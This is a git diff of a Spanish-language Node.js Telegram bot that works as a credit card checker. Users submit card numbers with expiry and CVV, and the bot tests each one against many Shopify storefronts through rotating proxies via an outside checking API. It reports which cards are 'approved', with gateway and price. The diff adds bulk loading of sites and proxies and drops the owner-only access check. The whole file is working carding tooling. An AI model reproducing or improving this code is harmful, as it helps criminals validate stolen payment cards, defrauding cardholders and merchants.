@@ -5,7 +5,6 @@ const fs = require('fs');
 
 /* ================== ENV ================== */
 const BOT_TOKEN = process.env.BOT_TOKEN;
-const OWNER_ID = Number(process.env.OWNER_ID);
 const API_BASE = 'https://auto-shopify-api-production.up.railway.app/index.php';
 
 if (!BOT_TOKEN) {
@@ -20,18 +19,14 @@ const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 const DATA_FILE = './data.json';
 let data = fs.existsSync(DATA_FILE)
   ? JSON.parse(fs.readFileSync(DATA_FILE))
-  : { sites: [], proxies: [], activeSite: null, activeProxy: null };
+  : { sites: [], proxies: [] };
 
 function saveData() {
   fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
 }
 
-function isOwner(id) {
-  return id === OWNER_ID;
-}
-
 /* ================== RUNTIME ================== */
-const running = {}; // chatId => boolean
+const running = {};
 
 /* ================== API ================== */
 async function callChkAPI({ site, cc, proxy }) {
@@ -54,162 +49,113 @@ async function callChkAPI({ site, cc, proxy }) {
   }
 }
 
-/* ================== UI ================== */
-const mainMenu = {
-  reply_markup: {
-    inline_keyboard: [
-      [{ text: '🚀 Multi CHK', callback_data: 'ui_multichk' }],
-      [{ text: '🌐 Sites', callback_data: 'ui_sites' }, { text: '🧰 Proxies', callback_data: 'ui_proxies' }],
-      [{ text: '📊 Estado', callback_data: 'ui_status' }],
-      [{ text: '⚙️ Admin', callback_data: 'ui_admin' }],
-      [{ text: '❓ Help', callback_data: 'ui_help' }],
-      [{ text: '⛔ Stop', callback_data: 'ui_stop' }]
-    ]
-  }
-};
-
-const backMenu = {
-  reply_markup: {
-    inline_keyboard: [[{ text: '⬅️ Volver', callback_data: 'ui_back' }]]
-  }
-};
-
 /* ================== START ================== */
 bot.onText(/\/start/, (msg) => {
   bot.sendMessage(
     msg.chat.id,
-`🤖 *Bot activo*
+`🤖 Bot activo
 
-Usa los botones o comandos.
-Todo es secuencial y estable.`,
-    { parse_mode: 'Markdown', ...mainMenu }
+Comandos:
+• /addconfig → agregar sites + proxies
+• /multichk → ejecutar
+• /stop → detener
+• /status → ver estado`
   );
 });
 
-/* ================== HELP ================== */
-bot.onText(/\/help/, (msg) => {
+/* ================== STATUS ================== */
+bot.onText(/\/status/, (msg) => {
   bot.sendMessage(
     msg.chat.id,
-`❓ *Ayuda*
+`📊 Estado actual
 
-• /multichk → ejecuta checks (secuencial)
-• /stop → detiene el proceso
-
-Formato correcto:
-\`\`\`
-/multichk
-4111111111111111|12|28|123
-\`\`\`
-
-Los botones solo guían (no ejecutan).`,
-    { parse_mode: 'Markdown', ...mainMenu }
+🌐 Sites: ${data.sites.length}
+🧰 Proxies: ${data.proxies.length}`
   );
 });
 
-/* ================== CALLBACKS ================== */
-bot.on('callback_query', (q) => {
-  const chatId = q.message.chat.id;
+/* ================== ADD CONFIG ================== */
+bot.onText(/\/addconfig([\s\S]*)/, (msg, match) => {
+  const chatId = msg.chat.id;
+  const input = match[1];
 
-  switch (q.data) {
-    case 'ui_multichk':
-      bot.sendMessage(
-        chatId,
-`🚀 *Multi CHK*
-
-Formato:
-\`\`\`
-/multichk
-4111111111111111|12|28|123
-\`\`\`
-
-Se probará con TODOS los sites y proxies.`,
-        { parse_mode: 'Markdown', ...backMenu }
-      );
-      break;
-
-    case 'ui_sites':
-      bot.sendMessage(
-        chatId,
-`🌐 *Sites*
-
-Actualmente hay **${data.sites.length}** site(s).
-Configúralos en \`data.json\`.
+  if (!input || !input.includes('[SITES]') || !input.includes('[PROXIES]')) {
+    return bot.sendMessage(
+      chatId,
+`❌ Formato incorrecto
 
 Ejemplo:
 \`\`\`
-"sites": ["https://site1.com", "https://site2.com"]
+/addconfig
+[SITES]
+https://site1.com
+https://site2.com
+
+[PROXIES]
+ip:port:user:pass
+ip:port:user:pass
 \`\`\``,
-        { parse_mode: 'Markdown', ...backMenu }
-      );
-      break;
-
-    case 'ui_proxies':
-      bot.sendMessage(
-        chatId,
-`🧰 *Proxies*
-
-Actualmente hay **${data.proxies.length}** proxy(s).
-Configúralos en \`data.json\`.
-
-Ejemplo:
-\`\`\`
-"proxies": ["ip:port:user:pass"]
-\`\`\``,
-        { parse_mode: 'Markdown', ...backMenu }
-      );
-      break;
-
-    case 'ui_status':
-      bot.sendMessage(
-        chatId,
-`📊 *Estado actual*
-
-🌐 Sites: ${data.sites.length}
-🧰 Proxies: ${data.proxies.length}
-⏳ En ejecución: ${running[chatId] ? 'Sí' : 'No'}`,
-        { parse_mode: 'Markdown', ...backMenu }
-      );
-      break;
-
-    case 'ui_admin':
-      if (!isOwner(q.from.id)) {
-        bot.sendMessage(chatId, '❌ Solo admin', backMenu);
-        break;
-      }
-      bot.sendMessage(
-        chatId,
-`⚙️ *Panel Admin*
-
-• Reinicia procesos
-• Ver estado
-• Control total`,
-        { parse_mode: 'Markdown', ...backMenu }
-      );
-      break;
-
-    case 'ui_help':
-      bot.sendMessage(
-        chatId,
-`❓ *Help rápido*
-
-Usa /multichk para ejecutar.
-Usa /stop para detener.
-Revisa Sites/Proxies desde botones.`,
-        { parse_mode: 'Markdown', ...backMenu }
-      );
-      break;
-
-    case 'ui_stop':
-      running[chatId] = false;
-      bot.sendMessage(chatId, '⛔ Proceso detenido');
-      break;
-
-    case 'ui_back':
-      bot.sendMessage(chatId, 'Menú principal', mainMenu);
-      break;
+      { parse_mode: 'Markdown' }
+    );
   }
 
-  bot.answerCallbackQuery(q.id);
+  const sitesBlock = input.split('[SITES]')[1].split('[PROXIES]')[0];
+  const proxiesBlock = input.split('[PROXIES]')[1];
+
+  const sites = sitesBlock.split('\n').map(x => x.trim()).filter(Boolean);
+  const proxies = proxiesBlock.split('\n').map(x => x.trim()).filter(Boolean);
+
+  let addedSites = 0;
+  let addedProxies = 0;
+
+  for (const s of sites) {
+    if (!data.sites.includes(s)) {
+      data.sites.push(s);
+      addedSites++;
+    }
+  }
+
+  for (const p of proxies) {
+    if (!data.proxies.includes(p)) {
+      data.proxies.push(p);
+      addedProxies++;
+    }
+  }
+
+  saveData();
+
+  bot.sendMessage(
+    chatId,
+`✅ Configuración guardada
+
+🌐 Sites añadidos: ${addedSites}
+🧰 Proxies añadidos: ${addedProxies}
+
+Totales:
+🌐 ${data.sites.length}
+🧰 ${data.proxies.length}`
+  );
+});
+
+/* ================== DELETE ================== */
+bot.onText(/\/delsites (.+)/, (msg, match) => {
+  const arg = match[1].trim();
+  if (arg === 'all') {
+    const c = data.sites.length;
+    data.sites = [];
+    saveData();
+    return bot.sendMessage(msg.chat.id, `🌐 Sites eliminados: ${c}`);
+  }
+});
+
+bot.onText(/\/delproxies (.+)/, (msg, match) => {
+  const arg = match[1].trim();
+  if (arg === 'all') {
+    const c = data.proxies.length;
+    data.proxies = [];
+    saveData();
+    return bot.sendMessage(msg.chat.id, `🧰 Proxies eliminados: ${c}`);
+  }
 });
 
 /* ================== MULTI-CHK ================== */
@@ -217,34 +163,19 @@ bot.onText(/\/multichk([\s\S]*)/, async (msg, match) => {
   const chatId = msg.chat.id;
 
   if (!data.sites.length || !data.proxies.length) {
-    return bot.sendMessage(chatId, '❌ Añade sites y proxies en data.json primero');
+    return bot.sendMessage(chatId, '❌ No hay sites o proxies');
   }
 
   const input = match[1].trim();
-  if (!input) {
-    return bot.sendMessage(
-      chatId,
-`❌ Formato incorrecto
-
-Ejemplo:
-\`\`\`
-/multichk
-4111111111111111|12|28|123
-\`\`\``,
-      { parse_mode: 'Markdown' }
-    );
-  }
+  if (!input) return bot.sendMessage(chatId, '❌ Envía tarjetas');
 
   const ccs = input.split('\n').map(x => x.trim()).filter(Boolean);
   running[chatId] = true;
 
-  let approved = 0;
-  let declined = 0;
-
   const total = data.sites.length * data.proxies.length * ccs.length;
-  let done = 0;
+  let done = 0, approved = 0, declined = 0;
 
-  const progressMsg = await bot.sendMessage(chatId, `⏳ 0/${total}\n✅ 0 ❌ 0`);
+  const progressMsg = await bot.sendMessage(chatId, `⏳ 0/${total}`);
 
   for (const site of data.sites) {
     for (const proxy of data.proxies) {
@@ -252,20 +183,15 @@ Ejemplo:
         if (!running[chatId]) break;
 
         const r = await callChkAPI({ site, cc, proxy });
-
         if (r.approved) {
           approved++;
-          await bot.sendMessage(
-            chatId,
+          await bot.sendMessage(chatId,
 `━━━━━━━━━━━━━━
 💳 ${r.cc}
 🏪 ${r.gateway}
 💰 ${r.price}
-✅ ${r.response}`
-          );
-        } else {
-          declined++;
-        }
+✅ ${r.response}`);
+        } else declined++;
 
         done++;
         try {
@@ -275,21 +201,16 @@ Ejemplo:
           );
         } catch {}
       }
-      if (!running[chatId]) break;
     }
-    if (!running[chatId]) break;
   }
 
   running[chatId] = false;
 
-  bot.sendMessage(
-    chatId,
-`✅ *Finalizado*
+  bot.sendMessage(chatId,
+`✅ Finalizado
 Total: ${total}
 Aprobadas: ${approved}
-Rechazadas: ${declined}`,
-    { parse_mode: 'Markdown' }
-  );
+Rechazadas: ${declined}`);
 });
 
 /* ================== STOP ================== */
